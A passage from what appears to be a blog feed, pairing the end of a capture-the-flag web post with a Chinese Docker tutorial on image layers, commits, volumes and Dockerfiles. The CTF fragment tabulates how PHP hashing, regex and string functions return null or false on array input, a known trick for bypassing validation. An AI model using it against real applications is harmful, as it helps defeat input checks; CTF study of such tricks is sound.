class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">md5(<span class="keyword">Array</span>()) = <span class="literal">null</span></span><br><span class="line">sha1(<span class="keyword">Array</span>()) = <span class="literal">null</span>    </span><br><span class="line">ereg(pattern,<span class="keyword">Array</span>()) = <span class="literal">null</span></span><br><span class="line">preg_match(pattern,<span class="keyword">Array</span>()) = <span class="literal">false</span></span><br><span class="line">strcmp(<span class="keyword">Array</span>(), <span class="string">&quot;abc&quot;</span>) = <span class="literal">null</span></span><br><span class="line">strpos(<span class="keyword">Array</span>(),<span class="string">&quot;abc&quot;</span>) = <span class="literal">null</span></span><br><span class="line">strlen(<span class="keyword">Array</span>()) = <span class="literal">null</span></span><br></pre></td></tr></table></figure></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> ctf-web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>docker从入门到精通(三)</title>
      <link href="2020/12/01/docker%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A-%E4%B8%89/"/>
      <url>2020/12/01/docker%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A-%E4%B8%89/</url>
      
        <content type="html"><![CDATA[<p>docker原理和docker的核心技术</p><span id="more"></span><h2 id="Docker镜像加载原理"><a href="#Docker镜像加载原理" class="headerlink" title="Docker镜像加载原理"></a>Docker镜像加载原理</h2><blockquote><p>UnionFS（联合文件系统）</p></blockquote><p>UnionFS 联合文件系统（Union File  System）：2004年由纽约州立大学石溪分校开发，它可以把多个目录(也叫分支)内容联合挂载到同一个目录下，而目录的物理位置是分开的。UnionFS允许只读和可读写目录并存，就是说可同时删除和增加内容。UnionFS应用的地方很多，比如在多个磁盘分区上合并不同文件系统的主目录，或把几张CD光盘合并成一个统一的光盘目录(归档)。另外，具有写时复制(copy-on-write)功能UnionFS可以把只读和可读写文件系统合并在一起，虚拟上允许只读文件系统的修改可以保存到可写文件系统当中。 </p><p>特性:一次同时加载多个文件系统，但从外面看，只能看到一个文件系统，联合加载会把各层文件系统的叠加在一起，最终的文件系统会包括所有的底层文件和目录</p><blockquote><p>docker镜像加载原理</p></blockquote><p>docker的镜像实际是一层一层的文件系统组成，这种文件系统被称为unionFS</p><p>bootfs(boot file system)主要包括bootloader和kernel，bootloader 主要是加载引导kernel，linux启动时会加载bootfs文件系统，在Docker镜像的最底层就是bootfs。</p><p>rootfs(root file system),在bootfs之上。包含的就是典型的linux系统中的/dev,/proc,/bin,etc 等标准目录和文件。rootfs就是各种不同的操作系统发行版，比如ubuntu、centos等。</p><p><img src="/2020/12/01/docker%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A-%E4%B8%89/1606829684882.png" class="lazyload" data-srcset="/2020/12/01/docker%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A-%E4%B8%89/1606829684882.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="1606829684882"></p><p>对于一个精简的OS,rootfs可以很小，只需要包含最基本的命令工具程序库即可。所以容器更轻便！</p><p><img src="/2020/12/01/docker%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A-%E4%B8%89/1606829916878.png" class="lazyload" data-srcset="/2020/12/01/docker%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A-%E4%B8%89/1606829916878.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="1606829916878"></p><h3 id="Docker分层理解"><a href="#Docker分层理解" class="headerlink" title="Docker分层理解"></a>Docker分层理解</h3><blockquote><p>分层的镜像</p></blockquote><p>我们可以去下载一个镜像，注意下载的日志输出，可以看到是一层一层的在下载！</p><p><img src="/2020/12/01/docker%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A-%E4%B8%89/1606835636649.png" class="lazyload" data-srcset="/2020/12/01/docker%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A-%E4%B8%89/1606835636649.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="1606835636649"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker image inspect redis</span><br></pre></td></tr></table></figure><p><img src="/2020/12/01/docker%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A-%E4%B8%89/1606964553095.png" class="lazyload" data-srcset="/2020/12/01/docker%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A-%E4%B8%89/1606964553095.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="1606964553095"></p><p><strong>理解：</strong></p><p>所有的Docker镜像都起始于一个基础镜像成，当进行修改或者增加新的内容时，就会在当前镜像层之上，创新新的镜像层。</p><p>如下图所示，该镜像包含三个镜像层</p><p><img src="/2020/12/01/docker%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A-%E4%B8%89/1606964686247.png" class="lazyload" data-srcset="/2020/12/01/docker%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A-%E4%B8%89/1606964686247.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="1606964686247"></p><p>在添加额外的镜像层的同时，镜像始终保持当前镜像的组合。下图中有一个简单的例子，每个镜像曾包含是哪个文件，而镜像包含了来自两个镜像层的六个文件</p><p><img src="/2020/12/01/docker%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A-%E4%B8%89/1606964859431.png" class="lazyload" data-srcset="/2020/12/01/docker%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A-%E4%B8%89/1606964859431.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="1606964859431"></p><p>上图的镜像层跟之前图中的略有区别，主要目的是便于展示文件</p><p>下图展示一个稍微复杂的三层镜像，在外部看来整个镜像只要六个文件，这是因为最上层的文件7是文件5的一个更新版本。</p><p><img src="/2020/12/01/docker%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A-%E4%B8%89/1606964980587.png" class="lazyload" data-srcset="/2020/12/01/docker%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A-%E4%B8%89/1606964980587.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="1606964980587"></p><p>这种情况下，上层镜像层中的文件覆盖了底层镜像层中的文件。这样就使得文件的更新版本作为一个新镜像层添加到了镜像当中。Docker通过存储引擎（新版本采用快照机制）的方式来实现镜像层堆栈。并保证多镜像对外展示位同一的文件系统。</p><p>Docker 在windows 上仅支持windowsfilter一种储存引擎，改引擎基于NTFS文件系统之上实现了分层和CoW[1]。</p><p>下图展示了与系统显示相同的三层镜像。所有镜像层堆叠并合并，对外提供同一的试图。</p><p><img src="/2020/12/01/docker%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A-%E4%B8%89/1606965444412.png" class="lazyload" data-srcset="/2020/12/01/docker%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A-%E4%B8%89/1606965444412.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="1606965444412"></p><blockquote><p>特点</p></blockquote><p>Docker镜像都是只读的，当容器启动时，一个新的可写层被加载到镜像的顶部！</p><p>这一层就是我们通常说的容器层，容器之下的都叫镜像层！</p><p><img src="/2020/12/01/docker%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A-%E4%B8%89/1606965946581.png" class="lazyload" data-srcset="/2020/12/01/docker%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A-%E4%B8%89/1606965946581.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="1606965946581"></p><h2 id="Commit镜像"><a href="#Commit镜像" class="headerlink" title="Commit镜像"></a>Commit镜像</h2><hr><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker commit 提交容器成为一个新的副本 </span><br><span class="line">docker commit -m=&quot;提交的描述信息&quot; -a=&quot;作者&quot; 容器id 目标镜像名:[TAG]</span><br></pre></td></tr></table></figure><h4 id="实战测试"><a href="#实战测试" class="headerlink" title="实战测试"></a>实战测试</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">启动一个默认的tomcat</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">发现默认的tomcat 没有webapps应用，镜像的原因，官方镜像默认webapps下面没有文件</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">自己拷贝进去基本文件</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">将我们操作过的容器通过commit提交为一个镜像！我们以后使用我们修改过的镜像即可，这就是我们自己的一个修改的镜像</span></span><br></pre></td></tr></table></figure><p><img src="/2020/12/01/docker%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A-%E4%B8%89/1606967374913.png" class="lazyload" data-srcset="/2020/12/01/docker%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A-%E4%B8%89/1606967374913.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="1606967374913"></p><h2 id="容器数据卷"><a href="#容器数据卷" class="headerlink" title="容器数据卷"></a>容器数据卷</h2><hr><h3 id="什么是容器数据卷"><a href="#什么是容器数据卷" class="headerlink" title="什么是容器数据卷"></a>什么是容器数据卷</h3><hr><p><strong>docker的理念回顾</strong></p><p>将应用和环境打包成一个镜像！</p><p>数据？如果数据都存在容器中，容器删除，数据就会丢失！需求：数据可以持久化</p><p>mysql，容器删了，删库跑路！需求：mysql数据存储在本地！</p><p>容器之间可以有一个数据共享的技术！Docker 容器中产生的数据，同步到本地！</p><p>这就是卷！容器目录挂载在linux下</p><p><img src="/2020/12/01/docker%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A-%E4%B8%89/1606967812980.png" class="lazyload" data-srcset="/2020/12/01/docker%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A-%E4%B8%89/1606967812980.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="1606967812980"></p><p>总之：容器的持久化和同步操作！容器间也是可以数据共享的！</p><h3 id="数据卷挂载"><a href="#数据卷挂载" class="headerlink" title="数据卷挂载"></a>数据卷挂载</h3><hr><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">docker run -it -v 主机目录：容器内目录</span><br><span class="line"><span class="meta">#</span><span class="bash">测试</span></span><br><span class="line">[root@iZ8vbgt047thtwcw9p956rZ ~]# docker run -it -v /root/test:/home centos /bin/bash</span><br><span class="line"><span class="meta">#</span><span class="bash">启动起来后可以通过docker inspect 容器id</span></span><br></pre></td></tr></table></figure><p><img src="/2020/12/01/docker%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A-%E4%B8%89/1606969003720.png" class="lazyload" data-srcset="/2020/12/01/docker%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A-%E4%B8%89/1606969003720.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="1606969003720"></p><p>测试文件的同步</p><p><img src="/2020/12/01/docker%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A-%E4%B8%89/1606969201278.png" class="lazyload" data-srcset="/2020/12/01/docker%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A-%E4%B8%89/1606969201278.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="1606969201278"></p><p><img src="/2020/12/01/docker%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A-%E4%B8%89/1606969241132.png" class="lazyload" data-srcset="/2020/12/01/docker%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A-%E4%B8%89/1606969241132.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="1606969241132"></p><h3 id="实战：安装mysql"><a href="#实战：安装mysql" class="headerlink" title="实战：安装mysql"></a>实战：安装mysql</h3><hr><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -d  -p 3310:3306 -v /root/mysql/conf:/etc/mysql/conf.d -v /root/mysql/data:/var/lib/mysql  -e MYSQL_ROOT_PASSWORD=123456  mysql:5.7</span><br></pre></td></tr></table></figure><p><img src="/2020/12/01/docker%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A-%E4%B8%89/1606997031181.png" class="lazyload" data-srcset="/2020/12/01/docker%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A-%E4%B8%89/1606997031181.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="1606997031181"></p><p><img src="/2020/12/01/docker%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A-%E4%B8%89/1606997054019.png" class="lazyload" data-srcset="/2020/12/01/docker%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A-%E4%B8%89/1606997054019.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="1606997054019"></p><p>当我删掉容器时 数据依然保留，实现了容器数据的持久化</p><h3 id="匿名挂载和具名挂载"><a href="#匿名挂载和具名挂载" class="headerlink" title="匿名挂载和具名挂载"></a>匿名挂载和具名挂载</h3><hr><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">匿名挂载</span></span><br><span class="line">docker run -d -P --name  nginx01 -v /etc/nginx nginx</span><br><span class="line"><span class="meta">#</span><span class="bash">查看卷情况</span></span><br><span class="line">[root@iZ8vbgt047thtwcw9p956rZ data]# docker volume ls</span><br><span class="line">DRIVER              VOLUME NAME</span><br><span class="line">local               0a7651f5e9f81607e4f88ca18d991db80332cdc82c66ece4825349cd0388e9b8</span><br><span class="line">local               1d9fa7581cdaa18b34c3a9956fb096b5ed4a78a4263fe6d46428c44511c53df1</span><br><span class="line">local               2a87524ba70a0c21e8bf272c5d8fa3bc9b2c103af78d781d24b4769f5ce0ef8f</span><br><span class="line">local               3ad8d08c7e4b1d7fa3cba6cece2a1eb79b59d44bc60cb262f86323d57db0b9b5</span><br><span class="line">local               4d4b6214177e35d247d25d5667c2a5455b1ae288c894e013d17e831c58e41323</span><br><span class="line">local               5e6020d6a6257ce27d3f97e5a2db9cdc9677022fa13e1a9b2bee06568c5933fd</span><br><span class="line">local               26babbcf4b2443c6e88b143fa1d7d32044d45afeefe0c7fbe8ecffb3f000a71d</span><br><span class="line">local               82d0e1f8fd164f3530f3ae7d0692142ba09245bcb0781cea9a45883c75ec4c8f</span><br><span class="line">local               92fed24888df0c636e8192a0ec8debad711760321c5269a343376069cb85c232</span><br><span class="line">local               100a539e9ff150910d86bef2c68633be15aad3ac08f7d4b987cfee765de1c1d0</span><br><span class="line">local               382fa3a6549d2a2511ed14fdf7e297b96bc65a8fb0c107b8538ada40f30801cc</span><br><span class="line">local               602e762594674a6c71c9e68111fea7e6f9d6fe92463fc7d0c0387383b9a73e2b</span><br><span class="line">local               628d9c3b0e80db81b519ad9dec3d3e9db22fcdd82b48f3cb0152d64f718875d0</span><br><span class="line">local               5025f1c0a862f14b2581db6ebb0e6c7b012854c79c0ec149cf3438ea42050313</span><br><span class="line">local               6383a5b1ec44bee9fdf5df32f0d7880a3c890a4b48b9e66a0af7d54346e47495</span><br><span class="line">local               8166df1dec997e2970267bac900090cdbf6d4a79f26b01c8b258a9981d14edc1</span><br><span class="line"><span class="meta">#</span><span class="bash">具名挂载</span></span><br><span class="line"><span class="meta">#</span><span class="bash">通过 -v 卷名：容器内路径</span></span><br><span class="line">docker run -d -P --name nginx02 -v juming-nginx:/etc/nginx nginx</span><br><span class="line"><span class="meta">#</span><span class="bash">查看卷情况</span></span><br><span class="line">docker volume ls</span><br><span class="line">local               4207549652c2493cfa6864c8329304fd31866595c81457d3908aeccdc1fe7317</span><br><span class="line">local               a589b7c33fad1bec8dda93aeec2b3ff41e9075787a73f9c4fa5d015e8f6f7afe</span><br><span class="line">local               b45178f0142bb2ba08a16ce9ae36a083e73c0d3721ab53140d6a5ec976afa190</span><br><span class="line">local               juming-nginx</span><br><span class="line"><span class="meta">#</span><span class="bash">查看该卷的详细信息</span></span><br><span class="line">[root@iZ8vbgt047thtwcw9p956rZ data]# docker volume inspect juming-nginx</span><br><span class="line">[</span><br><span class="line">    &#123;</span><br><span class="line">        &quot;CreatedAt&quot;: &quot;2020-12-03T20:15:21+08:00&quot;,</span><br><span class="line">        &quot;Driver&quot;: &quot;local&quot;,</span><br><span class="line">        &quot;Labels&quot;: null,</span><br><span class="line">        &quot;Mountpoint&quot;: &quot;/var/lib/docker/volumes/juming-nginx/_data&quot;,</span><br><span class="line">        &quot;Name&quot;: &quot;juming-nginx&quot;,</span><br><span class="line">        &quot;Options&quot;: null,</span><br><span class="line">        &quot;Scope&quot;: &quot;local&quot;</span><br><span class="line">    &#125;</span><br><span class="line">]</span><br><span class="line"><span class="meta">#</span><span class="bash">docker工作目录</span></span><br><span class="line">[root@iZ8vbgt047thtwcw9p956rZ docker]# ls</span><br><span class="line">builder  buildkit  containers  image  network  overlay2  plugins  runtimes  swarm  tmp  trust  volumes</span><br><span class="line">[root@iZ8vbgt047thtwcw9p956rZ docker]# pwd</span><br><span class="line">/var/lib/docker</span><br></pre></td></tr></table></figure><p>所有的docker容器内的卷，没有指定目录的情况下<code>/var/lib/docker/volumes/xxx/_data</code></p><p>我们通过具名挂载可以方便的找到我们的一个卷，大多数情况在使用的<code>具名挂载</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">如何确定是具名挂载还是匿名挂载，还是指定路径挂载</span></span><br><span class="line">-v 容器内路径 #匿名挂载</span><br><span class="line">-v 卷名：容器内路径 #匿名挂载</span><br><span class="line">-v /宿主机绝对路径：容器内路径 #指定路径下载</span><br></pre></td></tr></table></figure><p>拓展：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">通过 -v 容器内路径：ro rw 改变读写权限</span></span><br><span class="line">ro readonly # 只读</span><br><span class="line">rw readwrite #可读可写</span><br><span class="line"><span class="meta">#</span><span class="bash">一旦这个设置了容器权限，容器对我们挂载出来的内容就有限定了</span></span><br><span class="line">docker run -d -P --name nginx02 -v juming-nginx:/etc/nginx:ro nginx</span><br><span class="line">docker run -d -P --name nginx02 -v juming-nginx:/etc/nginx:rw nginx</span><br><span class="line"><span class="meta">#</span><span class="bash">ro 要看到 ro就说明这个路径只能通过宿主机来操作了，容器内部不可操作</span></span><br></pre></td></tr></table></figure><h3 id="初识Dockerfile"><a href="#初识Dockerfile" class="headerlink" title="初识Dockerfile"></a>初识Dockerfile</h3><hr><p>Dockerfile就是用来构建docker镜像的构建文件！命令脚本！</p><p>通过这个脚本可以生成镜像，一层一层的，脚本一个个 的命令，每一个命令都是一层</p><p>构建一个简单的镜像</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">创建一个dockerfile文件，名字可以修改</span></span><br><span class="line"><span class="meta">#</span><span class="bash">文件中的内容  指令（大写） 参数</span></span><br><span class="line">FORM centos</span><br><span class="line">VOLUME [&quot;volume01&quot;,&quot;volume02&quot;]</span><br><span class="line">CMD echo &quot;----end----&quot;</span><br><span class="line">CMD /bin/bash</span><br><span class="line"><span class="meta">#</span><span class="bash">每一个命令都是镜像的一层</span></span><br></pre></td></tr></table></figure><p><img src="/2020/12/01/docker%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A-%E4%B8%89/1607256627828.png" class="lazyload" data-srcset="/2020/12/01/docker%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A-%E4%B8%89/1607256627828.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="1607256627828"></p><p><img src="/2020/12/01/docker%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A-%E4%B8%89/1607256725774.png" class="lazyload" data-srcset="/2020/12/01/docker%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A-%E4%B8%89/1607256725774.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="1607256725774"></p><p>匿名挂载，查一下卷挂载的路径</p><p><img src="/2020/12/01/docker%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A-%E4%B8%89/1607256904483.png" class="lazyload" data-srcset="/2020/12/01/docker%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A-%E4%B8%89/1607256904483.png" 